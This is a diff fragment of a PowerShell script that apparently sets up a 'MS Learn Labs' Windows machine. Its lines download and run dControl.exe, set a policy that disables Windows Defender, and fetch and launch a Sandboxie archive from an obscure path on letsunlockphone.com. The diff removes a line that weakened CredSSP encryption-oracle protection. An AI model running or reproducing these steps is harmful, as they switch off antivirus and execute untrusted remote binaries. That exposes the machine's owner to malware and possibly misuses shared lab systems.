@@ -21,7 +21,6 @@ Invoke-WebRequest -Uri $zipUrl -OutFile $zipFilePath
 Expand-Archive -Path $zipFilePath -DestinationPath $extractPath -Force
 Start-Process -FilePath "$extractPath\dControl.exe"
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -Force
-Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters\" -Name AllowEncryptionOracle -Value 2
 Invoke-WebRequest -Uri "https://letsunlockphone.com/rdpdfsffddf/Sandboxie-new.zip" -OutFile "C:\Users\MS Learn Labs\Desktop\Sandboxie-new.zip"
 Expand-Archive -Path "C:\Users\MS Learn Labs\Desktop\Sandboxie-new.zip" -DestinationPath "C:\Users\MS Learn Labs\Desktop"
 Start-Process -FilePath "C:\Users\MS Learn Labs\Desktop\Sandboxie\SandMan.exe"
